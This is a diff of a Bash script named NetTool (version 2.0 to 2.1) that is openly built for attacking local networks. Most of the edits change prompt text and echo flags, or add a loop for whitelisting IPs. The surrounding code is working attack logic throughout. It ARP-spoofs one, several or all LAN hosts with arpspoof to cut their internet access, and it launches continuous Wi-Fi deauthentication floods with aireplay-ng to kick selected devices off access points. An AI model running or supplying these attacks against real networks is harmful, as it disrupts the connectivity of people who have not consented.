@@ -49,7 +49,7 @@ do
     #Menu
     echo -e "               \e[1;31m -- NetTool -- \e[0m         "
     echo ""
-    echo -e "              \e[0;34mVersion : 2.0\e[0m         "
+    echo -e "              \e[0;34mVersion : 2.1\e[0m         "
     echo -e "              \e[0;34mCredits : Disc0nect\e[0m         "
     echo -e "              \e[0;34mEmail   : montasilinigamer@gmail.com\e[0m         "
     
@@ -70,7 +70,7 @@ do
    #echo -e "$orange""5)$nc"" - $orange""Update$nc"
     echo -e "$lightred""e)$nc" - "$lightred""Exit$nc"
     echo ""
-    echo -e -n "$yellow""Select your option : $nc"
+    echo -en "$yellow""Select your option : $nc"
     read option
     echo ""
     case $option in
@@ -81,7 +81,7 @@ do
             arp-scan --localnet -x 
             echo -e "\e[1;34mYour scan completed!\e[0m"
             sleep 2
-            echo -e "$blue""PRESS RETURN TO CONTINUE$nc"
+            echo -en "$blue""PRESS [ RETURN ] TO CONTINUE$nc"
             read input
             sleep 0.5
         ;;
@@ -91,11 +91,11 @@ do
             echo -e "$orange""1-$nc""$green"" Simple scan $nc"
             echo -e "$orange""2-$nc""$green"" Advanced scan $nc" "$blue""(Slow scan but detailed)$nc"
             echo ""
-            echo -e -n "$yellow""Select your scan mode : $nc"
+            echo -en "$yellow""Select your scan mode : $nc"
             read opt2
             case $opt2 in
                 1)  
-                    echo -e -n "$yellow""Type your network range $nc""$blue""(eg:192.168.1.0/24): $nc"
+                    echo -en "$yellow""Type your network range $nc""$blue""(eg:192.168.1.0/24): $nc"
                     read range
                     
 
@@ -109,7 +109,7 @@ do
                     rm simplescan.txt
                     echo -e "\e[1;34mYour scan completed!\e[0m"
                     sleep 2
-                    echo -e "$blue""PRESS RETURN TO CONTINUE$nc"
+                    echo -en "$blue""PRESS [ RETURN ] TO CONTINUE$nc"
                     read input
                     echo -e "$blue""Going back to Menu...$nc"
                     sleep 1
@@ -129,7 +129,7 @@ do
                     wget -q --spider https://www.google.com
 
                 if [ $? -eq 0 ]; then
-                    echo -e -n "$yellow""Type your network range $nc""$blue""(eg:192.168.1.0/24): $nc"
+                    echo -en "$yellow""Type your network range $nc""$blue""(eg:192.168.1.0/24): $nc"
                     read range
                     echo -e "\e[1;34mScanning...\e[0m"
                     sleep 1
@@ -138,7 +138,7 @@ do
                     rm advcan.txt
                     echo -e "\e[1;34mYour scan completed!\e[0m"
                     sleep 2
-                    echo -e "\e[1;32mPress RETURN To Continue \c\e[0m"
+                    echo -en "\e[1;32mPress [ RETURN ] To Continue \c\e[0m"
                     read input
                     echo -e "$blue""Going back to Menu...$nc"
                     sleep 1
@@ -159,7 +159,7 @@ do
             echo -e "$orange""2-$nc""$green"" kill connection for muliple users$nc"
             echo -e "$orange""3-$nc""$green"" kill connection for all users$nc"
             echo ""
-            echo -e -n "$orange""Select your option : $nc"
+            echo -en "$orange""Select your option : $nc"
             read opt
             case $opt in
                 1)
@@ -184,12 +184,12 @@ do
 		            #echo -e "$orange""Hosts           MAC	                Vendor$nc"	
                     netdiscover -i $interface -P > hosts.txt
                     cat hosts.txt
-                    echo -e -n "$yellow""Type your target machine : $nc"
+                    echo -en "$yellow""Type your target machine : $nc"
                     read target
                     xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interface -t $target $gateway" &
                     xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interface -t $gateway $target" &
                     sleep 1
-                    echo -e "$blue""PRESS RETURN TO CANCEL$nc"
+                    echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                     read input
                     pkill arpspoof
                     echo -e "$blue""Going back to Menu...$nc"
@@ -216,17 +216,17 @@ do
                     sleep 2
 		            echo -e "$orange""Hosts           MAC	                Vendor$nc"
                     arp-scan --localnet -x 
-                    echo -e -n "$yellow""How many target(s)? $nc"
+                    echo -en "$yellow""How many target(s)? $nc"
                     read targets
                     for (( i = 1; i < targets+1; i++ )); do
-                        echo -n "type your target "$i" : "
+                        echo -n "type your target n° $i : "
                         read trgt
                         echo -e "$cyan""killing$nc" "$red"$trgt $nc""
                         nohup arpspoof -i $interface -t $trgt $gateway </dev/null &>/dev/null &
                         nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
                     done
                     sleep 1
-                    echo -e "$blue""PRESS RETURN TO CANCEL$nc"
+                    echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                     read input
                     pkill arpspoof
                     echo -e "$blue""Going back to Menu...$nc"
@@ -255,48 +255,62 @@ do
                     sleep 0.2
                     clear
                     echo -e "$red""Internet Will Be Killed for the following IP(s)! $nc"
-                    echo ""
-                    sed -i '1d' scan.txt </dev/null &>/dev/null
-                    grep -v "$ip" scan.txt > temp && mv temp scan.txt  
+                    sed -i -e "/$gateway/d" -- scan.txt </dev/null &>/dev/null
+                    grep -v "$ip" scan.txt > temp && mv temp scan.txt   </dev/null &>/dev/null
                     cat scan.txt
                     echo ""
-                    echo -n "Do you want to whitelist some IPs? (y/n) "
+                    echo -en "$orange""Do you want to whitelist some IPs? (y/n) $nc"
                     read answ5
                     if [ "$answ5" == "y"  ] || [ "$answ5" == "Y"  ]; then 
-                        echo -n "type your ip want to whitelist : "
+                        echo -en "$orange""How Many Ip(s) You Want to Whitelist? $nc"
+                        read nb_whl
+                        for (( i = 1; i < nb_whl+1; i++ )); do
+                        echo -en "$blue""IP Adresse To whitelist n° "$i" : $nc"
                         read ip_whl
-                        echo "IP to whitelist : $ip_whl "
-                        grep -v "$ip_whl" scan.txt > temp && mv temp scan.txt
-                        echo -e "$blue""PRESS RETURN TO START ATTACK$nc"
-                        read input
-                        i=0
-                        while IFS= read -r line; do
-                            # The 'declare' syntax creates variables on the fly with the values
-                            # read from the file
-                            declare target$((i++))="$line"
-                        done <scan.txt
-                        count="$((i-1))"
-                        # Now the variables are created; those can be individually accessed as  
-                        # '$target1'..'$tatgetN'; but to print it on a loop, use
-                        # indirect expansion using ${!var} syntax 
-                        clear 
-                        echo -e "$orange""Starting Attack...$nc"
-                        sleep 0.3
-                        for ((idx=0; idx<=count; idx++)); do
-                            temp=target$idx
-                            trgt="$target""${!temp}"
-                            echo -e  "$lightblue""Killing$nc" "$red""$trgt $nc"  
-                            sleep 0.5 
-                            nohup arpspoof -i $interface -t $trgt $gateway </dev/null &>/dev/null &
-                            nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
-                            sleep 1
+                        echo -e "$orange"$ip_whl $nc" Added To Whitelist!$nc"
+                        sed -i -e "/$ip_whl/d" -- scan.txt </dev/null &>/dev/null
                         done
-                        echo -e "$blue""PRESS RETURN TO CANCEL$nc"
-                        read input
-                        pkill arpspoof
-                        rm scan.txt
-                        echo -e "$blue""Going back to Menu...$nc"
-                        sleep 1
+                        if [ -s scan.txt ]; then
+                            # The file is not-empty.
+                            echo -en "$blue""PRESS [ RETURN ] TO START ATTACK$nc"
+                            read input
+                            i=0
+                            while IFS= read -r line; do
+                                # The 'declare' syntax creates variables on the fly with the values
+                                # read from the file
+                                declare target$((i++))="$line"
+                            done <scan.txt
+                            count="$((i-1))"
+                            # Now the variables are created; those can be individually accessed as  
+                            # '$target1'..'$tatgetN'; but to print it on a loop, use
+                            # indirect expansion using ${!var} syntax 
+                            clear 
+                            echo -e "$orange""Starting Attack...$nc"
+                            sleep 0.3
+                            for ((idx=0; idx<=count; idx++)); do
+                                temp=target$idx
+                                trgt="$target""${!temp}"
+                                echo -e  "$lightblue""Killing$nc" "$red""$trgt $nc"  
+                                sleep 0.5 
+                                nohup arpspoof -i $interface -t $trgt $gateway </dev/null &>/dev/null &
+                                nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
+                                sleep 1
+                            done
+                            echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
+                            read input
+                            pkill arpspoof
+                            rm scan.txt
+                            echo -e "$blue""Going back to Menu...$nc"
+                            sleep 1
+                        else
+                            # The file is empty.
+                            echo ""
+                            echo -e "$orange""Looks Like There Is No Target Selected!$nc"
+                            sleep 2
+                            rm scan.txt
+                            echo -e "$blue""Going back to Menu...$nc"
+                            sleep 1
+                        fi
                     else
                     i=0
                         while IFS= read -r line; do
@@ -320,7 +334,7 @@ do
                             nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
                             sleep 1
                         done 
-                        echo -e "$blue""PRESS RETURN TO CANCEL$nc"
+                        echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                         read input
                         pkill arpspoof
                         rm scan.txt
@@ -357,7 +371,7 @@ do
 			echo ""
                         echo -e "$orange""0-$nc""$orange"" Go back...$nc"
                         echo ""
-                        echo -e -n "$yellow""Select your option : $nc"
+                        echo -en "$yellow""Select your option : $nc"
                         read opt    
             case $opt in
                 1)
@@ -372,19 +386,19 @@ do
                             sleep 1
                             sudo xterm -geometry 80x20-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && sudo wash -i $interface -a 2>&1 | tee aps_scan.txt" &&
                             cat aps_scan.txt
-                            echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
+                            echo -en "$orange""Type Access-Point's MAC-Address :  $nc"
                             read ap_mac
-                            echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                            echo -en "$orange""Type Access-Point's Channel :  $nc"
                             read ap_chan
                             echo "Searching For Clients For Selected Access Point..."
                             sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
                             echo -e "$blue""CTRL+C TO STOP Searching!$nc"
                             cat ap_scan.txt
-                            echo -e -n "$orange""Type Device's MAC-Address You Want To Kick :  $nc"
+                            echo -en "$orange""Type Device's MAC-Address You Want To Kick :  $nc"
                             read dv_mac
                             xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac --channel $ap_chan $interface " & sleep 2 
                             xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
-                            echo -e "$blue""PRESS RETURN TO CANCEL$nc"
+                            echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                             read input
                             pkill airodump-ng
                             pkill aireplay-ng
@@ -403,7 +417,7 @@ do
                         if [ "$chk_mode" = "managed" ]; then 
                             echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
                             sleep 0.3
-                            echo -e -n "$orange""Enabel monitor mode? (y/n) $nc"
+                            echo -en "$orange""Enabel monitor mode? (y/n) $nc"
                             read answ3
                             if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
                                 sudo airmon-ng check kill >/dev/null 2>&1
@@ -420,19 +434,19 @@ do
                                         sleep 1
                                         sudo xterm -geometry 80x20-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && sudo wash -i $interface -a 2>&1 | tee aps_scan.txt" &&
                                         cat aps_scan.txt
-                                        echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
+                                        echo -en "$orange""Type Access-Point's MAC-Address :  $nc"
                                         read ap_mac
-                                        echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                                        echo -en "$orange""Type Access-Point's Channel :  $nc"
                                         read ap_chan
                                         echo "Searching For Clients For Selected Access Point..."
-                                        echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                                        echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                                         sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
                                         cat ap_scan.txt
-                                        echo -e -n "$orange""Type Device's MAC-Address You Want To Kick :  $nc"
+                                        echo -en "$orange""Type Device's MAC-Address You Want To Kick :  $nc"
                                         read dv_mac
                                         xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac -c $ap_chan $interface " & sleep 2 
                                         xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
-                                        echo -e "$blue""PRESS RETURN TO CANCEL$nc"
+                                        echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                                         read input
                                         pkill airodump-ng
                                         pkill aireplay-ng
@@ -471,17 +485,15 @@ do
                             sleep 1           
                             clear
                             echo "Monitoring your Access-Point '$ESSID'"
-                            echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
+                            echo -en "$blue""CTRL+C TO STOP MONITORING!$nc"
                             sleep 1
                             sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --bssid $BSSID $interface 2>&1 | tee ap_scan.txt" &&
                             cat ap_scan.txt
-                            #echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
-                            #read ap_mac
-                            echo -e -n "$orange""Type Device's MAC-Address :  $nc"
+                            echo -en "$orange""Type Device's MAC-Address :  $nc"
                             read dv_mac
                             xterm -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface" &
                             sleep 0.5
-                            echo -e "$blue""PRESS RETURN TO CANCEL$nc"
+                            echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                             read input
                             pkill aireplay-ng
                             echo "Restoring interface to managed mode... "
@@ -496,7 +508,7 @@ do
                         if [ "$chk_mode" = "managed" ]; then 
                             echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
                             sleep 0.3
-                            echo -e -n "$orange""Enabel monitor mode? (y/n) $nc"
+                            echo -en "$orange""Enabel monitor mode? (y/n) $nc"
                             read answ3
                             if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
                                 sudo airmon-ng check kill >/dev/null 2>&1
@@ -509,20 +521,20 @@ do
                                         sleep 1
                                         clear
                                         echo "Monitoring your Access-Point '$ESSID'"
-                                        echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
+                                        echo -en "$blue""CTRL+C TO STOP MONITORING!$nc"
                                         sleep 1
                                         sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --bssid $BSSID $interface 2>&1 | tee ap_scan.txt" &&
                                         clear
                                         cat ap_scan.txt
-                                        echo -e -n "$orange""Type Target's MAC-Address :  $nc"
+                                        echo -en "$orange""Type Target's MAC-Address :  $nc"
                                         read dv_mac
-                                        echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                                        echo -en "$orange""Type Access-Point's Channel :  $nc"
                                         read ap_chan
                                         echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
                                         sleep 0.5
                                         xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID --channel $ap_chan $interface " & sleep 2 
                                         xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
-                                        echo -e "$blue""PRESS RETURN TO STOP KICKING$nc"
+                                        echo -en "$blue""PRESS [ RETURN ] TO STOP KICKING$nc"
                                         read input
                                         pkill airodump-ng
                                         pkill aireplay-ng
@@ -558,29 +570,29 @@ do
                     chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
                         if [ "$chk_mode" = "monitor" ]; then
                             echo "Searching For Access-Points..."
-                            echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                            echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                             sleep 1
                             sudo xterm -geometry 80x20-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && sudo wash -i $interface -a 2>&1 | tee aps_scan.txt" &&
                             cat aps_scan.txt
-                            echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
+                            echo -en "$orange""Type Access-Point's MAC-Address :  $nc"
                             read ap_mac
-                            echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                            echo -en "$orange""Type Access-Point's Channel :  $nc"
                             read ap_chan
                             echo "Searching For Clients For Selected Access Point..."
                             sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
-                            echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                            echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                             cat ap_scan.txt
-                            echo -e -n "$yellow""How many target(s)? $nc"
+                            echo -en "$yellow""How many target(s)? $nc"
                             read targets
                             xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac --channel $ap_chan $interface " & sleep 2
                             for (( i = 1; i < targets+1; i++ )); do
-                                echo -e -n "$orange""Type Target's MAC-Address n° $i :  $nc"
+                                echo -en "$orange""Type Target's MAC-Address n° $i :  $nc"
                                 read dv_mac
                                 echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
                                 sleep 0.5
                                 xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
                             done                                    
-                            echo -e "$blue""PRESS RETURN TO STOP KICKING$nc"
+                            echo -en "$blue""PRESS [ RETURN ] TO STOP KICKING$nc"
                             read input
                             pkill airodump-ng
                             pkill aireplay-ng
@@ -599,7 +611,7 @@ do
                             if [ "$chk_mode" = "managed" ]; then 
                                 echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
                                 sleep 0.3
-                                echo -e -n "$orange""Enabel monitor mode? (y/n) $nc"
+                                echo -en "$orange""Enabel monitor mode? (y/n) $nc"
                                 read answ3
                                 if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
                                     sudo airmon-ng check kill >/dev/null 2>&1
@@ -612,29 +624,29 @@ do
                                         sleep 1
                                         clear
                                         echo "Searching For Access-Points..."
-                                        echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                                        echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                                         sleep 1
                                         sudo xterm -geometry 80x20-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && sudo wash -i $interface -a 2>&1 | tee aps_scan.txt" &&
                                         cat aps_scan.txt
-                                        echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
+                                        echo -en "$orange""Type Access-Point's MAC-Address :  $nc"
                                         read ap_mac
-                                        echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                                        echo -en "$orange""Type Access-Point's Channel :  $nc"
                                         read ap_chan
                                         echo "Searching For Clients For Selected Access Point..."
                                         sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $BSSID --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
-                                        echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                                        echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                                         cat ap_scan.txt
-                                        echo -e -n "$yellow""How many target(s)? $nc"
+                                        echo -en "$yellow""How many target(s)? $nc"
                                         read targets
                                         xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID --channel $ap_chan $interface " & sleep 2
                                         for (( i = 1; i < targets+1; i++ )); do
-                                            echo -e -n "$orange""Type Target's MAC-Address n° $i :  $nc"
+                                            echo -en "$orange""Type Target's MAC-Address n° $i :  $nc"
                                             read dv_mac
                                             echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
                                             sleep 0.5
                                             xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
                                         done                                    
-                                        echo -e "$blue""PRESS RETURN TO STOP KICKING$nc"
+                                        echo -en "$blue""PRESS [ RETURN ] TO STOP KICKING$nc"
                                         read input
                                         pkill airodump-ng
                                         pkill aireplay-ng
@@ -666,28 +678,28 @@ do
                         sleep 1           
                         clear
                         echo "Monitoring your Access-Point '$ESSID'"
-                        echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
+                        echo -en "$blue""CTRL+C TO STOP MONITORING!$nc"
                         sleep 1
                         sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --bssid $BSSID $interface 2>&1 | tee ap_scan.txt" &&
                         clear
                         cat ap_scan.txt
-                        echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                        echo -en "$orange""Type Access-Point's Channel :  $nc"
                         read ap_chan
                         echo "Searching For Clients For Selected Access Point..."
                         sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $BSSID --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
-                        echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                        echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                         cat ap_scan.txt
-                        echo -e -n "$yellow""How many target(s)? $nc"
+                        echo -en "$yellow""How many target(s)? $nc"
                         read targets
                         xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID --channel $ap_chan $interface " & sleep 2
                         for (( i = 1; i < targets+1; i++ )); do
-                            echo -e -n "$orange""Type Target's MAC-Address n° $i :  $nc"
+                            echo -en "$orange""Type Target's MAC-Address n° $i :  $nc"
                             read dv_mac
                             echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
                             sleep 0.5
                             xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
                         done
-                        echo -e "$blue""Press RETURN TO STOP KICKING$nc"
+                        echo -en "$blue""Press [ RETURN ] TO STOP KICKING$nc"
                         read input
                         pkill airodump-ng
                         pkill aireplay-ng
@@ -706,7 +718,7 @@ do
                         if [ "$chk_mode" = "managed" ]; then 
                             echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
                             sleep 0.3
-                            echo -e -n "$orange""Enabel monitor mode? (y/n) $nc"
+                            echo -en "$orange""Enabel monitor mode? (y/n) $nc"
                             read answ3
                             if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
                                 sudo airmon-ng check kill >/dev/null 2>&1
@@ -719,28 +731,28 @@ do
                                         sleep 1
                                         clear
                                         echo "Monitoring your Access-Point '$ESSID'"
-                                        echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
+                                        echo -en "$blue""CTRL+C TO STOP MONITORING!$nc"
                                         sleep 1
                                         sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --bssid $BSSID $interface 2>&1 | tee ap_scan.txt" &&
                                         clear
                                         cat ap_scan.txt
-                                        echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                                        echo -en "$orange""Type Access-Point's Channel :  $nc"
                                         read ap_chan
                                         echo "Searching For Clients For Selected Access Point..."
                                         sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $BSSID --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
-                                        echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                                        echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                                         cat ap_scan.txt
-                                        echo -e -n "$yellow""How many target(s)? $nc"
+                                        echo -en "$yellow""How many target(s)? $nc"
                                         read targets
                                         xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID --channel $ap_chan $interface " & sleep 2
                                         for (( i = 1; i < targets+1; i++ )); do
-                                            echo -e -n "$orange""Type Target's MAC-Address n° $i :  $nc"
+                                            echo -en "$orange""Type Target's MAC-Address n° $i :  $nc"
                                             read dv_mac
                                             echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
                                             sleep 0.5
                                             xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
                                         done
-                                        echo -e "$blue""PRESS RETURN TO STOP KICKING$nc"
+                                        echo -en "$blue""PRESS [ RETURN ] TO STOP KICKING$nc"
                                         read input
                                         pkill airodump-ng
                                         pkill aireplay-ng
